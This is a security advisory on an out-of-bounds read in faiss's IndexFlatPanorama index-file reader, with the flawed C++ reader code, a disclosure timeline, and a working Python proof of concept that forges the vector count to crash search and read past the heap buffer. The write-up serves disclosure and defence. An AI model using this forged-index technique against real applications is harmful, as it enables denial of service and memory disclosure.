https://github.com/facebookresearch/faiss

## Finding: Out-of-bounds read in IndexFlatPanorama deserialization via missing codes/ntotal consistency check

Affected Versions: confirmed on faiss-cpu 1.14.2 and git HEAD 6513a24

CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H

CWE: CWE-125 Out-of-bounds Read

### Disclosure
 - 9 June 2026 - reported via FB Bug Bounty
 - 21 June 2026 - FB closed without explaination "Due to the volume of reports we currently receive, we are unable to provide detailed information as to how we reached this decision."

### Summary

Loading an untrusted faiss index file and searching it can cause an out-of-bounds read and crash (SIGSEGV). The `IndexFlatPanorama` deserialization path reads the vector count (`ntotal`) from the file but, unlike every other flat-index reader, never checks that the stored `codes` buffer is large enough for that count. A malicious index declaring a huge `ntotal` with a tiny `codes` buffer is accepted, and a normal `search()` then reads far past the heap buffer. Loading and searching shared or downloaded indexes is a common, deliberate action.

### Details

In `faiss/impl/index_read.cpp`, the `IxFP`/`IxFp` (IndexFlatPanorama) branch (around lines 1526 to 1546) reads:

```cpp
READ1(d);                  // line 1529: raw int, no range check
READ1(n_levels); READ1(batch_size);
... make_unique<IndexFlatL2Panorama>(d, n_levels, batch_size);
READ1(idxp->ntotal);       // line 1541: attacker-controlled, unvalidated
READ1_BOOL(idxp->is_trained);
READVECTOR(idxp->codes);   // line 1543: size NOT tied to ntotal * code_size
READVECTOR(idxp->cum_sums);// line 1544
```

The byte-limit guard inside `READVECTOR` only bounds the allocation of `codes`; it does not tie `codes`/`cum_sums` length to the separately read `ntotal`. Every sibling flat reader has the check this branch lacks: `IxFI`/`IxF2`/`IxFl` (IndexFlat) at line 1560 does `FAISS_THROW_IF_NOT(idxf->codes.size() == idxf->ntotal * idxf->code_size)`, and `IxPQ` (line 1610) and `IxHE` (line 1600) do the same. The CHANGELOG shows a deliberate "validate consistency during deserialization" hardening series (PRs #5203, #5115, #5056, #5023, #4978) that did not cover the newer Panorama flat reader.

The out-of-bounds access happens at search time: `IndexFlat`/Panorama search computes distances over `codes.data()` for indices in `[0, ntotal)`, so a forged `ntotal` reads memory well past the buffer.

This is distinct from any published CVE; no advisory covers Panorama deserialization.

### PoC

```
pip install faiss-cpu numpy
python3 poc_panorama_oob.py
```

`poc_panorama_oob.py`:

```python
import faiss, numpy as np, struct, os, tempfile, sys
d, n = 8, 16
idx = faiss.IndexFlatL2Panorama(d, 4, 8)            # n_levels=4, batch_size=8
idx.add(np.random.RandomState(0).rand(n, d).astype('float32'))
seed = os.path.join(tempfile.gettempdir(), 'pano_seed.faiss')
faiss.write_index(idx, seed)
# Layout: 'IxFP'(4) d:i32(4) n_levels:u64(8) batch:u64(8) ntotal:i64(8)...  ntotal at offset 24
b = bytearray(open(seed, 'rb').read())
struct.pack_into('<q', b, 24, 5_000_000)           # claim 5,000,000 vectors; codes stay tiny
evil = os.path.join(tempfile.gettempdir(), 'pano_evil.faiss')
open(evil, 'wb').write(b)
idx2 = faiss.read_index(evil)                       # accepted, no consistency error
print("read_index accepted forged ntotal =", idx2.ntotal, "(codes hold only", n, "vectors)")
idx2.search(np.random.RandomState(1).rand(1, d).astype('float32'), 5)  # OOB read -> SIGSEGV
```

Observed: `read_index` accepts the forged file, then `search()` aborts with `Segmentation fault (core dumped)` (exit 139). Confirmed for both `IxFP` (L2) and `IxFp` (inner product).

### Impact

Memory-safety out-of-bounds read triggered by a malicious index file. Any application that loads and searches an attacker-supplied faiss index gets a reliable crash (denial of service), plus a heap information-disclosure primitive because search distances are computed over out-of-range memory. Out-of-bounds write and code execution were not demonstrated, so severity is rated High rather than Critical.
